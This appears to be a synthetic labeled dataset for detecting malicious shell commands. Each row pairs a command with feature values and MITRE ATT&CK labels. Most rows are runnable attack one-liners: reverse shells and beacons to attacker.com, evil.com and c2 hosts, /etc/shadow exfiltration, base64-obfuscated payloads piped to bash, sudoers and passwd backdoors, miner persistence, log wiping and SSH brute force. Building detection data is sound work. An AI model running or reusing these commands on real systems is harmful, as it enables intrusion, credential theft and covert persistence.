echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
cat /tmp/encoded | xxd -r -p | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'aHlkcmEgLWwgYWRtaW4gLVAgL3Vzci9zaGFyZS93b3JkbGlzdHMvcm9ja3lvdS50eHQgc3NoOi8vMTAuMC4wLjE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
wget -q https://example.com/file.tar.gz,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
find / -perm -4000 -type f 2>/dev/null ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
passwd  -d  root  &&  echo  done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1098_Account_Manipulation'],synthetic
cat /etc/resolv.conf,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
cat /etc/shadow,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
useradd -m -s /bin/bash hacker ; history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bmV0IHVzZXIgL2FkZCBhdHRhY2tlciBQQHNzdzByZCB8IGVjaG8gZG9uZQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 0, 0]",['T1136_Create_Account'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
time medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh | > /dev/null 2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.56, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"bash -c ""echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxyZXRyaWV2ZSgnaHR0cDovL2V2aWwuY29tL3BheWxvYWQnLCAnL3RtcC9wYXlsb2FkJyki' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup nc -e /bin/bash attacker.com 80 &,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
"bash -c ""bash -i >& /dev/tcp/10.0.0.99/4444 0>&1""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo  'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8qIHwgc2xlZXAgMQ=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in | sleep 1,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'cGVybCAtZSAndXNlIFNvY2tldDsgLi4uJw==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nmcli connection show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
nohup gcc exploit.c -o exploit && ./exploit &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
"bash -c ""curl -s http://c2.attacker.com/beacon""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
dmidecode -t system,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1082_System_Information_Discovery'],synthetic
usermod -aG sudo compromised_user && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo echo 'bm9odXAgLi94bXJpZyAtLXVybCBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQzIC0tdXNlciB3YWxsZXQgJg==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
echo  'compromised  ALL=(ALL)  NOPASSWD:ALL'  >>  /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
time echo 'Y2F0IC9ldGMvcGFzc3dkIHwgYXdrIC1GOiAnJDMgPj0gMTAwMCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time cat /etc/shadow | > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
"python3 -c ""import urllib.request; urllib.request.urlopen('http://evil.com/?' + open('/etc/shadow').read())""","[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
nmap -sn 192.168.1.0/24 | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.2, 0.28, 1, 1]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
getent group sudo && sleep 1,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IHVybGxpYi5yZXF1ZXN0OyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKCdodHRwOi8vZXZpbC5jb20vPycgKyBvcGVuKCcvZXRjL3NoYWRvdycpLnJlYWQoKSki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
"bash -c ""su - admin && echo done""","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
nohup echo 'ZmluZCAvIC1wZXJtIC00MDAwIC10eXBlIGYgMj4vZGV2L251bGw=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
find /home -name '.env' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
nc -e /bin/bash attacker.com 80 | > /dev/null 2>&1,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo ip link show && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 1]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time find / -name 'id_rsa' 2>/dev/null,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
"bash -c ""echo 'aGVsbG8=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""echo 'Y3VybCAtcyBodHRwOi8vYzIuYXR0YWNrZXIuY29tL2JlYWNvbg==' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
time nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
cat /etc/shadow | nc 10.0.0.99 4444,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'c2ggLWMgJ2N1cmwgaHR0cDovL2V2aWwuY29tL3NoZWxsLnNoIHwgYmFzaCc=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl -sL http://evil.com/shell.sh -o /tmp/shell.sh | echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ncrack -p 22 --user root -P pass.lst 10.0.0.1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1110_Brute_Force'],synthetic
echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOy4uLic=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'ZWNobyAnKi81ICogKiAqICogY3VybCBodHRwOi8vYzIuY29tL2JlYWNvbicgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 ; echo done""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hydra  -l  admin  -P  /usr/share/wordlists/rockyou.txt  ssh://10.0.0.1  ;  >  /dev/null  2>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/group,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time getent group sudo | history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"python3 -c ""import urllib.request; urllib.request.urlretrieve('http://evil.com/payload', '/tmp/payload')""","[0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo grep -r 'password' /var/www/html --include='*.php',"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
time echo 'cGVybCAtZSAndXNlIFNvY2tldDsgLi4uJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet & ; echo done,"[0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 0]","['T1496_Resource_Hijacking', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cmVnIGRlbGV0ZSBIS0xNXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBEZWZlbmRlciB8IHNsZWVwIDE=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
nohup reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe | > /dev/null 2>&1 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.52, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'bm1hcCAtQSAtVDQgMTkyLjE2OC4xLjAvMjQgJiYgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ssh -L 8080:internal:80 user@jump.host,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup masscan -p1-65535 10.0.0.0/24 --rate=1000 ; sleep 1 &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8q' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'bGFzdCAtbiAxMA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1033_System_Owner_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 ; chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo 'TmV3LUl0ZW1Qcm9wZXJ0eSAtUGF0aCAnSEtMTTpcLi4uJyAtTmFtZSBQZXJzaXN0IC1WYWx1ZSAnQzpccGF5bG9hZC5leGUnIHwgY2htb2QgK3ggL3RtcC9wYXlsb2Fk' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
medusa  -h  10.0.0.1  -u  root  -P  /tmp/passwords.txt  -M  ssh,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1110_Brute_Force'],synthetic
rm -rf /tmp/* /var/tmp/* ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1059_Command_and_Scripting_Interpreter']",synthetic
dmesg  |  head  -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
"bash -c ""for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.6, 0, 0]",['T1110_Brute_Force'],synthetic
traceroute  google.com,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
shred -u /var/log/auth.log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'YWRkdXNlciAtLXNoZWxsIC9iaW4vYmFzaCAtLWRpc2FibGVkLXBhc3N3b3JkIGJhY2tkb29yIHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""whoami /all""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo 'aWZjb25maWcgLWEgOyBoaXN0b3J5IC1j' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup last -n 10 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0IHwgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nohup echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers && > /dev/null 2>&1 &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.48, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1053_Scheduled_Task'],synthetic
echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
nohup echo 'Y2F0IC9ldGMvZ3JvdXA=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
sudo mimikatz.exe 'sekurlsa::logonpasswords' exit,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'd2dldCAtcSAtTy0gLS1oZWFkZXI9J1gtQXV0aDogdG9rZW4xMjMnIGh0dHA6Ly9ldmlsLmNvbS9jbWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""masscan -p1-65535 10.0.0.0/24 --rate=1000""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.24, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
"bash -c ""cat /etc/os-release""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1082_System_Information_Discovery'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
sudo echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'c3NoIGFkbWluQGxvY2FsaG9zdA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup find /var/log -name '*.log' -exec truncate -s 0 {} \; &,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'bWFzc2NhbiAtcDEtNjU1MzUgMTAuMC4wLjAvMjQgLS1yYXRlPTEwMDAgfCBjaG1vZCAreCAvdG1wL3BheWxvYWQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
